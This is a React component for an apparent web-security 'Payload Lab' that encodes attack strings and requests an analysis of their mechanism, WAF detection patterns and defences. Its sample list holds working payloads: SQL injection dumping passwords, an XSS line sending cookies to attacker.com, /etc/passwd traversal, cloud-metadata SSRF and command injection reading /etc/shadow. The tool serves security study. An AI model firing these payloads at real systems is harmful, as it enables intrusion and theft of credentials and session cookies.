import React, { useState } from 'react';
import { Terminal, Lock, Cpu, Sparkles, RefreshCw, Copy, Check, ShieldAlert } from 'lucide-react';

export const PayloadPlayground: React.FC = () => {
  const [inputPayload, setInputPayload] = useState<string>("' OR '1'='1");
  const [encodingMode, setEncodingMode] = useState<'url' | 'base64' | 'hex' | 'html'>('url');
  const [encodedResult, setEncodedResult] = useState<string>('%27%20OR%20%271%27%3D%271');
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [aiAnalysis, setAiAnalysis] = useState<any | null>(null);
  const [copied, setCopied] = useState<boolean>(false);

  const samplePayloads = [
    { label: 'SQLi Bypass', category: 'SQL Injection', payload: "' UNION SELECT 1,username,password FROM users--" },
    { label: 'Stored XSS', category: 'Cross-Site Scripting', payload: '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>' },
    { label: 'LFI /etc/passwd', category: 'Path Traversal', payload: '../../../../../../etc/passwd' },
    { label: 'Cloud Metadata SSRF', category: 'SSRF', payload: 'http://169.254.169.254/latest/meta-data/' },
    { label: 'Command Injection', category: 'OS Command Injection', payload: '127.0.0.1; cat /etc/shadow' },
  ];

  const handleTransform = (val: string, mode: 'url' | 'base64' | 'hex' | 'html') => {
    try {
      if (mode === 'url') {
        setEncodedResult(encodeURIComponent(val));
      } else if (mode === 'base64') {
        setEncodedResult(btoa(val));
      } else if (mode === 'hex') {
        setEncodedResult(
          Array.from(val)
            .map((c) => c.charCodeAt(0).toString(16).padStart(2, '0'))
            .join(' ')
        );
      } else if (mode === 'html') {
        setEncodedResult(
          val.replace(/[\u00A0-\u9999<>&]/g, (i) => '&#' + i.charCodeAt(0) + ';')
        );
      }
    } catch (e) {
      setEncodedResult('Encoding error');
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const val = e.target.value;
    setInputPayload(val);
    handleTransform(val, encodingMode);
  };

  const handleModeChange = (mode: 'url' | 'base64' | 'hex' | 'html') => {
    setEncodingMode(mode);
    handleTransform(inputPayload, mode);
  };

  const handleAnalyzePayload = async () => {
    if (!inputPayload.trim()) return;

    setIsAnalyzing(true);
    setAiAnalysis(null);

    try {
      const response = await fetch('/api/explain-payload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: inputPayload }),
      });

      if (!response.ok) {
        throw new Error('Failed to analyze payload');
      }

      const data = await response.json();
      setAiAnalysis(data);
    } catch (err: any) {
      console.error(err);
    } finally {
      setIsAnalyzing(false);
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(encodedResult);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6">
      <div className="bg-slate-900/50 border border-slate-800 p-6 rounded-3xl space-y-1 shadow-xl">
        <div className="flex items-center gap-2">
          <Terminal className="w-5 h-5 text-purple-400" />
          <h2 className="text-xl font-bold text-white tracking-tight">Payload Lab & Encoder / Decoder</h2>
          <span className="bg-purple-500/10 text-purple-400 border border-purple-500/20 px-2.5 py-0.5 rounded-full text-[10px] font-mono font-medium">
            Exploit Analyzer
          </span>
        </div>
        <p className="text-xs text-slate-400">
          Synthesize, encode, and evaluate exploit vectors against Web Application Firewall (WAF) detection rules.
        </p>
      </div>

      <div className="flex items-center gap-2 flex-wrap bg-slate-900/50 border border-slate-800 p-4 rounded-3xl shadow-xl">
        <span className="text-xs font-mono text-slate-400">Sample Exploit Vectors:</span>
        {samplePayloads.map((sample) => (
          <button
            key={sample.label}
            onClick={() => {
              setInputPayload(sample.payload);
              handleTransform(sample.payload, encodingMode);
            }}
            className="text-xs font-mono bg-slate-800/80 hover:bg-slate-700 text-purple-300 border border-slate-700 px-3 py-1.5 rounded-xl transition-colors"
          >
            {sample.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="bg-slate-900/50 border border-slate-800 rounded-3xl p-6 space-y-4 shadow-xl">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <span className="text-xs font-mono font-bold text-white">Raw Attack Payload String</span>
            <div className="flex items-center gap-1 bg-slate-800/50 p-1 rounded-full border border-slate-800">
              {(['url', 'base64', 'hex', 'html'] as const).map((mode) => (
                <button
                  key={mode}
                  onClick={() => handleModeChange(mode)}
                  className={`px-3 py-1 rounded-full text-[11px] font-mono uppercase transition-all ${
                    encodingMode === mode
                      ? 'bg-purple-500/20 text-purple-300 border border-purple-500/40 font-bold'
                      : 'text-slate-400 hover:text-slate-200'
                  }`}
                >
                  {mode}
                </button>
              ))}
            </div>
          </div>

          <textarea
            value={inputPayload}
            onChange={handleInputChange}
            rows={5}
            className="w-full bg-[#070a12] border border-slate-800 rounded-2xl p-4 text-xs font-mono text-purple-300 focus:outline-none focus:border-purple-500 leading-relaxed"
            placeholder="Type payload string..."
          />

          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-xs font-mono text-slate-400 uppercase">
                Encoded ({encodingMode.toUpperCase()})
              </span>
              <button
                onClick={handleCopy}
                className="text-xs font-mono text-slate-400 hover:text-white flex items-center gap-1"
              >
                {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copied ? 'Copied' : 'Copy'}</span>
              </button>
            </div>

            <pre className="p-3 bg-[#070a12] border border-slate-800 rounded-xl text-xs font-mono text-cyan-300 overflow-x-auto leading-relaxed">
              <code>{encodedResult}</code>
            </pre>
          </div>

          <button
            onClick={handleAnalyzePayload}
            disabled={isAnalyzing || !inputPayload.trim()}
            className="w-full py-3.5 bg-slate-100 hover:bg-white text-slate-950 font-bold text-xs rounded-2xl flex items-center justify-center gap-2 shadow-md transition-all uppercase tracking-tight"
          >
            {isAnalyzing ? (
              <RefreshCw className="w-4 h-4 animate-spin text-slate-950" />
            ) : (
              <Terminal className="w-4 h-4 text-slate-950" />
            )}
            <span>Exploit Vector Analysis</span>
          </button>
        </div>

        <div className="bg-slate-900/50 border border-slate-800 rounded-3xl p-6 space-y-4 shadow-xl">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <span className="text-xs font-mono font-bold text-white flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-purple-400" />
              Exploit Mechanism & Hardened Defense
            </span>
          </div>

          {!aiAnalysis && !isAnalyzing && (
            <div className="text-center py-12 space-y-3">
              <Cpu className="w-10 h-10 text-slate-600 mx-auto" />
              <p className="text-xs text-slate-400 max-w-xs mx-auto">
                Click <strong className="text-purple-300">Exploit Vector Analysis</strong> to inspect trigger logic and WAF rules.
              </p>
            </div>
          )}

          {isAnalyzing && (
            <div className="text-center py-12 space-y-3">
              <RefreshCw className="w-8 h-8 text-purple-400 animate-spin mx-auto" />
              <p className="text-xs text-slate-400 font-mono">Deconstructing payload syntax...</p>
            </div>
          )}

          {aiAnalysis && !isAnalyzing && (
            <div className="space-y-4 text-xs">
              <div className="bg-purple-500/10 border border-purple-500/20 p-4 rounded-2xl space-y-1">
                <span className="text-[10px] font-mono text-purple-400 font-bold uppercase block">
                  Threat Classification
                </span>
                <span className="text-sm font-bold text-white">{aiAnalysis.category}</span>
                <span className="text-slate-300 block pt-1">{aiAnalysis.threatLevel} Threat</span>
              </div>

              <div className="space-y-2">
                <span className="text-xs font-mono text-slate-400 font-bold block">Exploit Mechanism:</span>
                <p className="text-slate-300 leading-relaxed bg-slate-800/40 p-3.5 rounded-2xl border border-slate-700/50">
                  {aiAnalysis.mechanism}
                </p>
              </div>

              <div className="space-y-2">
                <span className="text-xs font-mono text-slate-400 font-bold block">WAF Detection Pattern:</span>
                <p className="text-amber-300 font-mono text-[11px] bg-[#070a12] p-3.5 rounded-2xl border border-slate-800">
                  {aiAnalysis.wafDetectionPattern}
                </p>
              </div>

              <div className="space-y-2">
                <span className="text-xs font-mono text-slate-400 font-bold block">Sanitization Defense:</span>
                <p className="text-emerald-300 leading-relaxed bg-emerald-950/20 p-3.5 rounded-2xl border border-emerald-900/40">
                  {aiAnalysis.defenseStrategy}
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
